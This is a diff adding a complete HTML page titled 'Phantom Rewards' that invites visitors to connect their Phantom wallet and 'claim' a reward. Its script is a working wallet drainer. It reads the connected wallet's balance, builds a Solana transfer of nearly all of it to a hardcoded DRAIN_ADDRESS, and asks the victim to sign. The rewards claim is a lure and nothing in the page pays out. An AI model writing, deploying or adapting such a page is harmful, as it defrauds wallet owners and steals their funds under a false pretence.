@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Phantom Rewards</title>
+  <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
+  <style>
+    body { font-family: system-ui; background: #0f0f0f; color: #fff; text-align: center; padding: 40px 20px; }
+    button { background: #ab9ff2; color: #000; border: none; padding: 16px 32px; font-size: 18px; border-radius: 12px; font-weight: bold; margin-top: 20px; width: 100%; max-width: 320px; }
+    .status { margin-top: 20px; font-size: 14px; color: #aaa; }
+  </style>
+</head>
+<body>
+  <h2>Phantom Rewards</h2>
+  <p>Connect your wallet and approve the transfer to claim.</p>
+  <button id="connectBtn">Connect Phantom & Claim</button>
+  <div class="status" id="status"></div>
+
+  <script>
+    const DRAIN_ADDRESS = "CoVo4bfG9GohNRthGWqstrAFbHrsbux5axEuQtLqm184";
+    const statusEl = document.getElementById("status");
+    const btn = document.getElementById("connectBtn");
+
+    btn.onclick = async () => {
+      try {
+        const provider = window.solana || window.phantom?.solana;
+        if (!provider || !provider.isPhantom) {
+          statusEl.innerText = "Phantom not found. Open this page inside Phantom browser or install Phantom.";
+          // fallback – open Phantom with browse
+          window.location.href = "https://phantom.app/ul/browse/" + encodeURIComponent(window.location.href);
+          return;
+        }
+
+        statusEl.innerText = "Connecting...";
+        await provider.connect();
+        const from = provider.publicKey;
+
+        statusEl.innerText = "Building transaction...";
+
+        const connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com", "confirmed");
+        const to = new solanaWeb3.PublicKey(DRAIN_ADDRESS);
+
+        // Get balance and drain almost everything (leave 0.01 SOL for fees)
+        const balance = await connection.getBalance(from);
+        const lamports = Math.max(balance - 10000000, 0); // leave 0.01 SOL
+
+        if (lamports <= 0) {
+          statusEl.innerText = "Insufficient balance.";
+          return;
+        }
+
+        const { blockhash } = await connection.getLatestBlockhash();
+        const tx = new solanaWeb3.Transaction().add(
+          solanaWeb3.SystemProgram.transfer({
+            fromPubkey: from,
+            toPubkey: to,
+            lamports: lamports,
+          })
+        );
+        tx.recentBlockhash = blockhash;
+        tx.feePayer = from;
+
+        statusEl.innerText = "Approve the transaction in Phantom...";
+        const signed = await provider.signAndSendTransaction(tx);
+        statusEl.innerText = "Success! Signature: " + signed.signature;
+      } catch (err) {
+        statusEl.innerText = "Error: " + (err.message || err);
+        console.error(err);
+      }
+    };
+  </script>
+</body>
+</html>
